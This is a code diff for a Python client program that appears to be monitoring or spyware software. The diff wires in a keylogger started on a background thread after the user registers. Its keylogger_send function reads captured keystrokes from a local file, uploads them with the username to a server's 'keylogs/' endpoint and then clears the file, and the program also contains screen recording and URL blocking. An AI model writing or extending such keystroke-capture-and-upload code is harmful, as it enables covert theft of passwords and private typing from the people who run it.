@@ -10,6 +10,7 @@ import pyautogui
 import subprocess
 import _thread
 import schedule
+from keylogger import start_keylogger
 
 username = ""
 url = 'http://127.0.0.1:8000/'
@@ -102,23 +103,18 @@ def screen_record():
 
 
 def screen_record_thread():
-    print("hello")
     _thread.start_new_thread(screen_record, ())
 
 
 def keylogger_send():
-    f = open("READ_ME.txt", "r")
+    f = open("keylogs.txt", "r")
     x = f.read()
     print("data from file: " + x)
     send_get(send_url + "keylogs/", {'content': x, 'user': username})
     f.close()
-    f = open("READ_ME.txt", "w")
+    f = open("keylogs.txt", "w")
     f.write('')
     f.close()
-
-
-def start_keylogger():
-    exec(open("keylogger.py").read())
 
 
 def block_url():
@@ -174,6 +170,8 @@ def main():
             f = open("username.txt", "w")
             f.write(username)
             f.close()
+            _thread.start_new_thread(start_keylogger, ())
+            print("*")
             program_run()
             break
         else:
